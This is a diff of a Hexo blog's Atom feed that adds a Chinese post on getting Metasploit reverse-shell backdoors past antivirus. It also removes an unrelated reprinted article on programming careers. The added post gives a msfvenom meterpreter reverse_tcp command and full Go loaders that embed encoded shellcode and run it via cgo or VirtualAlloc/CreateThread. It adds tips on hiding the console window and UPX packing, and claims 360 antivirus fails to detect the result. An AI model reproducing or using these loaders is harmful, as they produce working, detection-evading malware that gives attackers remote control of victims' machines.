@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://akkuman.coding.me/"/>
-  <updated>2017-04-14T15:55:42.737Z</updated>
+  <updated>2017-04-20T05:10:03.124Z</updated>
   <id>http://akkuman.coding.me/</id>
   
   <author>
@@ -14,6 +14,39 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>关于msf反弹后门的免杀Tips</title>
+    <link href="http://akkuman.coding.me/2017/04/20/msf-AntiVirus.html"/>
+    <id>http://akkuman.coding.me/2017/04/20/msf-AntiVirus.html</id>
+    <published>2017-04-20T05:09:24.000Z</published>
+    <updated>2017-04-20T05:10:03.124Z</updated>
+    
+    <content type="html"><![CDATA[<p>msf是一个很强大的工具，我经常会在渗透用它来反弹shell，不过它生成的反弹后门会被不少杀软kill，这篇文章只是讲讲我在msf中一个简单的免杀小技巧<br><a id="more"></a></p>
+<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>我以前接触过一款python的远控，其实说是远控，基本也就是nc的功能加了一个服务端的web页面控制并加了一些其他的功能可以用来管理诸多客户机<br>这款远控我下载下来用过，并用pyinstaller打包成了exe（缺点是体积太过庞大），惊奇的是，360不杀它，然后自己想着其他语言是不是也会这样，于是我用golang写了一个简易版nc反弹，编译之后，也是不查杀的。python和golang有一个共同点，就是可以用来内联C编程，所以C语言的shellcode按理说应该会达到同样的效果</p>
+<h2 id="得到shellcode"><a href="#得到shellcode" class="headerlink" title="得到shellcode"></a>得到shellcode</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">msfvenom -p windows/meterpreter/reverse_tcp LPORT=5555 LHOST=192.168.1.100 <span class="_">-e</span> x86/shikata_ga_nai -i 11 <span class="_">-f</span> py &gt; 1.py</div></pre></td></tr></table></figure>
+<p>建议是生成32位的，如果想生成64位也可以，<code>-e x86/shikata_ga_nai -i 11</code>是指用<code>x86/shikata_ga_nai</code>编码迭代11次，然后生成py文件<br>py文件打开是shellcode，我们接下来对它进行一点小改造，对于python去执行shellcode的方法，相信小伙伴都已经不陌生，在《python灰帽子》中有讲解，我今天要使用的是golang，其实个人认为golang执行shellcode的代码是更简洁的</p>
+<h2 id="Golang环境搭建"><a href="#Golang环境搭建" class="headerlink" title="Golang环境搭建"></a>Golang环境搭建</h2><p>安装Golang32位（建议32位，与前面对应，在测试过程中，如果32位shellcode配合64位golang加32位gcc，就算把golang的GOARCH改为386也依旧会失败，建议一一对应），安装gcc32位（可以使用<a href="http://tdm-gcc.tdragon.net/download" target="_blank" rel="external">TDM-GCC</a>）</p>
+<h2 id="代码编写"><a href="#代码编写" class="headerlink" title="代码编写"></a>代码编写</h2><figure class="highlight golang"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">package</span> main</div><div class="line"></div><div class="line"><span class="comment">/*</span></div><div class="line">void call(char *code) &#123;</div><div class="line">    int (*ret)() = (int(*)())code;</div><div class="line">    ret();</div><div class="line">&#125;</div><div class="line">*/</div><div class="line"><span class="keyword">import</span> <span class="string">"C"</span></div><div class="line"><span class="keyword">import</span> <span class="string">"unsafe"</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</div><div class="line">    buf := <span class="string">""</span></div><div class="line">    buf += <span class="string">"\xdd\xc6\xd9\x74\x24\xf4\x5f\x33\xc9\xb8\xb3\x5e\x2c"</span></div><div class="line">    buf += <span class="string">"\xc9\xb1\x97\x31\x47\x1a\x03\x47\x1a\x83\xc7\x04\xe2"</span></div><div class="line">    buf += <span class="string">"\x46\x84\xfd\x72\xee\x0e\xb5\x96\x37\x04\x6d\x63\x9f"</span></div><div class="line">    buf += <span class="string">"\xcc\xa4\x3a\x8e\x8c\xf7\x39\x81\xca\xe4\x42\xff\xce"</span></div><div class="line">    buf += <span class="string">"\xa3\xa2\xdb\x06\xc0\x3f\xaf\x41\x73\xba\xf7\x20\x13"</span></div><div class="line">    buf += <span class="string">"\x98\x8c\xff\xfa\x0a\xda\x6e\xf2\x6d\xc3\x81\x07\xc0"</span></div><div class="line">    buf += <span class="string">"\x1b\x37\xeb\xa2\xa9\x32\x71\xaf\xe9\x20\xd1\xaa\x9e"</span></div><div class="line">    buf += <span class="string">"\xbd\x82\xf3\x81\x1f\xab\xbf\xc4\xd9\x6c\x75\x37\x3a"</span></div><div class="line">    buf += <span class="string">"\x53\x78\x90\x79\xaf\x93\x1b\xb3\x15\x09\xe5\x45\x5c"</span></div><div class="line">    buf += <span class="string">"\x26\x0f\x0d\x16\x52\xf1\x8a\x7e\x8b\xc4\x50\x8e\x0a"</span></div><div class="line">    buf += <span class="string">"\x38\x2f\x2b\x40\x73\x0b\xf0\x51\x5f\xc6\xbf\x04\x47"</span></div><div class="line">    buf += <span class="string">"\x80\x36\xe5\x88\x88\xb3\xfc\xa0\x52\xfe\x92\x81\x8d"</span></div><div class="line">    buf += <span class="string">"\x89\xf2\x6a\xcc\x7f\x9a\xe9\x1a\x30\x73\xa3\x63\x42"</span></div><div class="line">    buf += <span class="string">"\x10\xe9\xcf\x62\xe4\x06\x52\xe1\x8d\x88\xfe\x52\xc4"</span></div><div class="line">    buf += <span class="string">"\xc3\xed\x7a\x0e\x66\x5f\x8c\x2c\xef\xfa\xbd\x8c\x79"</span></div><div class="line">    buf += <span class="string">"\x6c\x01\xe3\x5c\xde\xc4\x8a\x4c\x7d\x34\x32\xb5\x23"</span></div><div class="line">    buf += <span class="string">"\x56\x6c\x52\x3f\x15\x26\x6a\xf8\x6b\x81\x2c\x23\x8d"</span></div><div class="line">    buf += <span class="string">"\x41\x6e\x24\x30\xc6\xcb\xba\x26\xd4\x3b\x37\xd3\xc6"</span></div><div class="line">    buf += <span class="string">"\xa8\x5a\x16\x8f\x1e\x27\xca\xcb\xda\x7f\x74\x62\xb2"</span></div><div class="line">    buf += <span class="string">"\x62\xa6\xb1\xfc\x64\x53\x3a\xa7\xa4\x21\x3d\x79\x08"</span></div><div class="line">    buf += <span class="string">"\x06\x74\x2a\xa2\xe7\x0d\x68\x16\xa3\x96\xe5\xad\x32"</span></div><div class="line">    buf += <span class="string">"\x10\xa3\x0f\x49\xc3\x69\xa7\x5b\x61\x1a\xf8\x1d\x9e"</span></div><div class="line">    buf += <span class="string">"\x9b\x3a\x00\xfc\x18\xc3\x42\x1a\xd6\x44\x5d\xfe\xc5"</span></div><div class="line">    buf += <span class="string">"\xb6\x68\xd2\xad\x24\xda\x74\xa7\xf3\x66\x9a\x42\x7a"</span></div><div class="line">    buf += <span class="string">"\x50\xf0\x0b\x47\xbc\xad\x6c\x1e\xca\xbe\x90\xca\xc3"</span></div><div class="line">    buf += <span class="string">"\x8e\x5b\xde\x66\xe2\xb3\x20\x6f\x38\x17\xc1\xac\xfb"</span></div><div class="line">    buf += <span class="string">"\xd3\x2f\x91\xa7\xff\x65\xd7\xd0\x25\x4c\xd4\xb3\x35"</span></div><div class="line">    buf += <span class="string">"\x38\xa1\x82\xb8\x23\x42\xe9\xa5\x95\x8e\xc4\x35\xca"</span></div><div class="line">    buf += <span class="string">"\x92\xfe\xde\x62\x70\xd6\x7a\x7f\xfd\xfb\xf0\x24\xbd"</span></div><div class="line">    buf += <span class="string">"\x5d\x6d\x3d\x13\xbc\x1d\x25\x54\x9d\x0e\x68\xc8\x9a"</span></div><div class="line">    buf += <span class="string">"\x10\x87\xf0\xc9\xac\x37\x57\x84\x23\x5f\x8a\xc0\xab"</span></div><div class="line">    buf += <span class="string">"\x52\x6e\xae\x79\xa2\xdb\xff\xd8\x41\x28\x8b\xd3\x9d"</span></div><div class="line">    buf += <span class="string">"\x68\x3c\x55\xf2\xfe\x0c\x8a\x38\xdf\xb3\x80\x9b\x70"</span></div><div class="line">    buf += <span class="string">"\x2b\x4e\xe1\xfa\x0b\xfe\xf5\xc3\x1a\x0d\x83\xb0\x69"</span></div><div class="line">    buf += <span class="string">"\xd0\x68\xfb\xe0\xae\xbd\x56\x52\x17\x9a\xf8\x8f\xc0"</span></div><div class="line">    buf += <span class="string">"\x14\x8c\xb0\xf7\x0e\x87\xfa\x54\xf4\x04\x4a\x5a\xc8"</span></div><div class="line">    buf += <span class="string">"\x89\x57\x0e\xbf\x7a\x76\x9b\xfe\xb8\x5f\x31\x42\xec"</span></div><div class="line">    buf += <span class="string">"\xaf\x18\x9e\x3f\xf0\x09\x79\x86\xb3\x08\x29\x50\xfd"</span></div><div class="line">    buf += <span class="string">"\xc3\x46\x7d\x24\x51\x5b\xd0\x81\x19\x6f\xc2\x2c\x17"</span></div><div class="line">    buf += <span class="string">"\xab\xa3\xb7\xd9\x6f\x82\xd9\x37\x5f\x38\x01\xd8\xfd"</span></div><div class="line">    buf += <span class="string">"\xfd\x11\x22\x61\xd0\x92\x45\x37\x4f\x6c\x4e\x91\x3b"</span></div><div class="line">    buf += <span class="string">"\x42\x07\xc5\x77\xdc\x52\xd6\xc7\x9d\x7b\x62\xba\x1c"</span></div><div class="line">    buf += <span class="string">"\x62\x3c\xde\xad\x96\x03\x55\xde\x9d\x52\x5c\x5d\x0c"</span></div><div class="line">    buf += <span class="string">"\x73\x0e\xc3\x4c\xae\x7d\x1c\x7c\x64\xaf\xbb\xce\xa6"</span></div><div class="line">    buf += <span class="string">"\x02\x0e\xb1\x51\xc4\x2d\x1b\x6b\xb7\x7c\xd9\x4b\xc3"</span></div><div class="line">    buf += <span class="string">"\x8c\x43\xd6\x1b\x2a\x4f\x5e\x0a\x9a\xd5\x4d\x45\x64"</span></div><div class="line">    buf += <span class="string">"\x6c\x0c\xc8\xf5\x59\xd7\x45\x36\x85\x99\x8d\x34\x65"</span></div><div class="line">    buf += <span class="string">"\x21\xd3\x3b\x35\xce\x22\x29\x0c\x4e\xca\x48\x3f\x55"</span></div><div class="line">    buf += <span class="string">"\x5d\x1b\xda\x35\xc1\x2d"</span></div><div class="line">    <span class="comment">// at your call site, you can send the shellcode directly to the C</span></div><div class="line">    <span class="comment">// function by converting it to a pointer of the correct type.</span></div><div class="line">    shellcode := []<span class="keyword">byte</span>(buf)</div><div class="line">    C.call((*C.char)(unsafe.Pointer(&amp;shellcode[<span class="number">0</span>])))</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>以上就是全部代码<br>其实Golang还有个执行shellcode的方法是不用内联C语言的，但是我这边测试能接到反弹shell，但是执行命令会直接断开，代码我也贴出来<br><figure class="highlight golang"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">package</span> main</div><div class="line"></div><div class="line"><span class="keyword">import</span> (</div><div class="line">    <span class="string">"syscall"</span></div><div class="line">    <span class="string">"unsafe"</span></div><div class="line">)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">ThreadExecute</span><span class="params">(Shellcode []<span class="keyword">byte</span>)</span></span> &#123;</div><div class="line">    <span class="keyword">var</span> K32 = syscall.MustLoadDLL(<span class="string">"kernel32.dll"</span>)</div><div class="line">    <span class="keyword">var</span> CreateThread = K32.MustFindProc(<span class="string">"CreateThread"</span>)</div><div class="line">    <span class="keyword">var</span> VirtualAlloc = K32.MustFindProc(<span class="string">"VirtualAlloc"</span>)</div><div class="line">    <span class="keyword">var</span> WaitForSingleObject = K32.MustFindProc(<span class="string">"WaitForSingleObject"</span>)</div><div class="line"></div><div class="line">    Addr, _, _ := VirtualAlloc.Call(<span class="number">0</span>, <span class="keyword">uintptr</span>(<span class="built_in">len</span>(Shellcode)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)</div><div class="line">    AddrPtr := (*[<span class="number">990000</span>]<span class="keyword">byte</span>)(unsafe.Pointer(Addr))</div><div class="line"></div><div class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>(Shellcode); i++ &#123;</div><div class="line">        AddrPtr[i] = Shellcode[i]</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    ThreadAddr, _, _ := CreateThread.Call(<span class="number">0</span>, <span class="number">0</span>, Addr, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</div><div class="line">    WaitForSingleObject.Call(ThreadAddr, <span class="number">0xFFFFFFFF</span>)</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>关于断开的原因，希望找出原因的能告知我一下，其实我们会发现，内联C是比较简单的</p>
+<h2 id="杀毒测试"><a href="#杀毒测试" class="headerlink" title="杀毒测试"></a>杀毒测试</h2><p>在代码所在目录cmd执行<code>go build</code>得到二进制文件（或者可以用<code>go build -ldflags=&quot;-s -w&quot;</code>减小体积，<code>`go build -ldflags=&quot;-H windowsgui -s -w&quot;</code>去掉命令窗口）<br><img src="https://ooo.0o0.ooo/2017/04/20/58f840f0e9a00.png" alt=""><br><img src="https://ooo.0o0.ooo/2017/04/20/58f840f8a704c.png" alt=""></p>
+<p>可以看到360的静态查杀和动态查杀都没有发现<br>那么是否正常工作呢<br><img src="https://ooo.0o0.ooo/2017/04/20/58f840f6d4862.png" alt=""></p>
+<p>可以看到完全是没问题的，体积比python编译出来的小的多，编译出来是500多kb，然后经过upx压缩了一下（测试upx压缩后功能依旧正常），降低到了200多kb<br><img src="https://ooo.0o0.ooo/2017/04/20/58f840dbdc23f.png" alt=""></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;msf是一个很强大的工具，我经常会在渗透用它来反弹shell，不过它生成的反弹后门会被不少杀软kill，这篇文章只是讲讲我在msf中一个简单的免杀小技巧&lt;br&gt;
+    
+    </summary>
+    
+      <category term="Hacker" scheme="http://akkuman.coding.me/categories/Hacker/"/>
+    
+    
+      <category term="Hacker" scheme="http://akkuman.coding.me/tags/Hacker/"/>
+    
+  </entry>
   
   <entry>
     <title>自己网盘的页面生成器(私用公开-Golang)</title>
@@ -906,68 +939,6 @@
       <category term="推荐向" scheme="http://akkuman.coding.me/tags/%E6%8E%A8%E8%8D%90%E5%90%91/"/>
     
       <category term="软件" scheme="http://akkuman.coding.me/tags/%E8%BD%AF%E4%BB%B6/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>web高级开发的成长之路</title>
-    <link href="http://akkuman.coding.me/2017/01/20/web%E9%AB%98%E7%BA%A7%E5%BC%80%E5%8F%91%E7%9A%84%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF.html"/>
-    <id>http://akkuman.coding.me/2017/01/20/web高级开发的成长之路.html</id>
-    <published>2017-01-20T14:53:41.000Z</published>
-    <updated>2017-03-03T15:39:54.598Z</updated>
-    
-    <content type="html"><![CDATA[<p>读了这篇文章之后感觉蛮受启发的，在此分享一下，献给和我一样处于困惑的朋友。</p>
-<p><strong>正文如下：</strong><br><a id="more"></a><br>本人也是coding很多年，虽然很失败，但也总算有点失败的心得，不过我在中国，大多数程序员都是像我一样，在一直走着弯路。如果想成为一个架构师，就必须走正确的路，否则离目标越来越远，正在辛苦工作的程序员们，你们有没有下面几种感觉？</p>
-<p>　　一、我的工作就是按时完成领导交给我的任务，至于代码写的怎样，知道有改进空间，但没时间去改进，关键是领导也不给时间啊。</p>
-<p>　　二、我发现我的水平总是跟不上技术的进步，有太多想学的东西要学，jQuery用的人最近比较多啊，听说最近MVC比较火，还有LINQ，听说微软又有Silverlight了……</p>
-<p>　　三、我发现虽然我工作几年了，除了不停的coding，Ctrl+C和Ctrl+V更熟练了，但编码水平并没有提高，还是一个普通程序员，但有人已经做到架构师了。</p>
-<p>　　四、工作好几年了，想跳槽换个工作，结果面试的考官都问了一些什么数据结构，什么垃圾回收，什么设计模式之类的东西，虽然看过，但是平时用不着，看了也忘记了，回答不上来，结果考官说我基础太差。。。</p>
-<p>　　有没有，如果没有，接下来就不用看了，你一定是大拿了，或者已经明白其中之道了，呵呵。</p>
-<p>　　如果有，恭喜你，你进入学习误区了，如果想在技术上前进的话，就不能一直的coding，为了完成需求而工作，必须在coding的同时，让我们的思维，水平也在不停的提高。</p>
-<p>　　写代码要经历下面几个阶段。</p>
-<p>　　一 、你必须学习面向对象的基础知识，如果连这个都忘了，那你的编程之路注定是在做原始初级的重复！</p>
-<p>　　很多程序员都知道类、方法、抽象类、接口等概念，但是为什么要面向对象，好处在哪里，要解决什么问题？只是明白概念，就是表达不清楚，然后在实 际工作中也用不上，过了一段时间，面向对象的东西又模糊了，结果是大多数程序员用着面向对象的语言做着面向过程的工作，因此要学习面向对象，首先应该明白 面向对象的目的是什么？</p>
-<p>　　面向对象的目的是什么？</p>
-<p>　　开发语言在不断发展，从机器语言，到汇编，到高级语言，再到第四代语言;软件开发方法在不断发展，从面向过程，面向对象，到面向方面等。虽然这些都在不断发展，但其所追求的目标却一直没变，这些目标就是：</p>
-<p>　　1. 降低软件开发的复杂度</p>
-<p>　　2. 提高软件开发的效率</p>
-<p>　　3. 提高软件质量：可维护性，可扩展性，可重用性等。</p>
-<p>　　其中语言的发展，开发方法的发展在1,2两条上面取得了极大的进步，但对于第3条，我们不能光指望开发方法本身来解决。</p>
-<p>　　提高软件质量：可维护性，可扩展性，可重用性等，再具体点，就是高内聚、低耦合，面向对象就是为了解决第3条的问题。因此要成为一个好的程序员，最绕不开的就是面向对象了。</p>
-<p>　　二、 要想学好面向对象，就必须学习设计模式。</p>
-<p>　　假定我们了解了面向对象的目的，概念了，但是我们coding过程中却发现，我们的面向对象的知识似乎一直派不上用场，其实道理很简单，是因为 我们不知道怎么去用，就像游泳一样，我们已经明白了游泳的好处，以及游泳的几种姿势，狗刨、仰泳、蛙泳、自由泳，但是我们依然不会游泳。。。。</p>
-<p>　　因此有了这些基本原则是不行的，我们必须有一些更细的原则去指导我们的设计，这就有了更基础的面向对象的五大原则，而把这几种原则更详细的应用 到实际中来，解决实际的问题，这就是设计模式。因此要学好OO，必须要学习设计模式，学习设计模式，按大师的话说，就是在人类努力解决的许多领域的成功方 案都来源于各种模式，教育的一个重要目标就是把知识的模式一代一代传下去。</p>
-<p>　　因此学习设计模式，就像我们在看世界顶级的游泳比赛，我们为之疯狂，为之着迷。</p>
-<p>　　三、学习设计模式</p>
-<p>　　正像我们并不想只是看别人表演，我们要自己学会游泳，这才是我们的目的所在。</p>
-<p>　　当我们看完几篇设计模式后，我们为之精神振奋，在新的coding的时候，我们总是想努力的用上学到的设计模式，但是经常在误用模式，折腾半天发现是在脱裤子抓痒。。。</p>
-<p>　　当学完设计模式之后，我们又很困惑，感觉这些模式简直太像了，很多时候我们分不清这些模式之间到底有什么区别，而且明白了设计过程中的一个致命 的东西——过度设计，因为设计模式要求我们高扩展性，高重用性，但是在需求提出之初，我们都不是神，除了依靠过去的经验来判断外，我们不知道哪些地方要扩 展，哪些地方要重用，而且过去的经验就一定是正确的吗？所以我们甚至不敢再轻易用设计模式，而是还一直在用面向过程的方法在实现需求。</p>
-<p>　　四、学习重构</p>
-<p>　　精彩的代码是怎么想出来的，比看到精彩的代码更加令人期待。于是我们开始思考，这些大师们莫非不用工作，需求来了没有领导规定完成时间，只以设 计精彩的代码为标准来开展工作？这样的工作太爽了，也不可能，老板不愿意啊。就算这些理想的条件他都有，他就一开始就设计出完美的代码来了？也不可能啊， 除非他是神，一开始就预料到未来的所有需求，那既然这些条件都没有，他们如何写出的精彩代码？</p>
-<p>　　Joshua Kerievsky在那篇著名的《模式与XP》〔收录于《极限编程研究》一书）中明白地指出：在设计前期使用模式常常导致过度工程（over- engineering)。这是一个残酷的现实，单凭对完美的追求无法写出实用的代码，而「实用」是软件压倒一切的要素。</p>
-<p>　　在《重构——改善既有的代码的设计》一书中提到，通过重构（refactoring），你可以找出改变的平衡点。你会发现所谓设计不再是一切动 作的前提，而是在整个开发过程中逐渐浮现出来。在系统构筑过程中，你可以学习如何强化设计；其间带来的互动可以让一个程序在开发过程中持续保有良好的设 计。</p>
-<p>　　总结起来就是说，我们在设计前期就使用设计模式，往往导致设计过度，因此应该在整个开发过程，整个需求变更过程中不断的重构现在的代码，才能让 程序一直保持良好的设计。由此可见，开发过程中需要一直重构，否则无论当初设计多么的好，随着需求的改变，都会变成一堆烂代码，难以维护，难以扩展。所谓 重构是这样一个过程：「在不改变代码外在行为的前提下，对代码做出修改，以改进程序的内部结构」。重构的目标，就是设计模式，更本质的讲就是使程序的架构 更趋合理，从而提高软件的可维护性，可扩展性，可重用性。</p>
-<p>　　《重构——改善既有的代码的设计》一书也是Martin Fowler等大师的作品，软件工程领域的超级经典巨著，与另一巨著《设计模式》并称”软工双雄”，不可不读啊。</p>
-<p>　　五、开始通往优秀软件设计师的路上</p>
-<p>　　通过设计模式和重构，我们的所学和我们工作的coding终于结合上了，我们可以在工作中用面向对象的思维去考虑问题，并开始学习重构了。这就 像游泳一样，我们看完了各种顶级的游泳比赛，明白各种规则，名人使用的方法和技巧，现在是时候回家去村旁边的小河里练练了。练习也是需要有教练的，推荐另 一本经典书叫《重构与模式》，引用他开篇的介绍，本书开创性地深入揭示了重构与模式这两种软件开发关键技术之间的联系，说明了通过重构实现模式改善既有的 设计，往往优于在新的设计早期使用模式。本书不仅展示了一种应用模式和重构的创新方法，而且有助于读者结合实战深入理解重构和模式。</p>
-<p>　　这本书正是我们需要的教练，值得一读。</p>
-<p>　　六、没有终点，只有坚持不懈的专研和努力。</p>
-<p>　　经过了几年的坚持，终于学会了灵活的运用各种模式，我们不需要去刻意的想用什么模式，怎么重构。程序的目标，就是可维护性，可扩展性，可重用 性，都已经成了一种编程习惯，一种思维习惯，就像我们练习了几年游泳之后，我们不用再刻意的去考虑，如何让自己能在水上漂起来，仰泳和蛙泳的区 别….. 而是跳进水里，就自然的游了起来，朝对岸游去。但是要和大师比起来，嘿嘿，我们还有很长的路要走，最终也可能成不了大师，但无论能不能成为大师，我们已经 走在了成为大师的正确的路上，我们和别的程序员已经开始不一样，因为他们无论再过多少年，他们的水平不会变，只是在重复造轮子，唯一比你快的，就是 Ctrl+C和Ctrl+V。</p>
-<p>　　正确的路上，只要坚持，就离目标越来越近，未来就一定会是一个优秀的架构师，和优秀架构师的区别，可能只是时间问题。</p>
-<p><strong>转自<a href="http://www.cnblogs.com/leefan/p/5489984.html" target="_blank" rel="external">李凡的博客</a></strong></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;读了这篇文章之后感觉蛮受启发的，在此分享一下，献给和我一样处于困惑的朋友。&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;正文如下：&lt;/strong&gt;&lt;br&gt;
-    
-    </summary>
-    
-      <category term="Web" scheme="http://akkuman.coding.me/categories/Web/"/>
-    
-    
-      <category term="life" scheme="http://akkuman.coding.me/tags/life/"/>
     
   </entry>
   
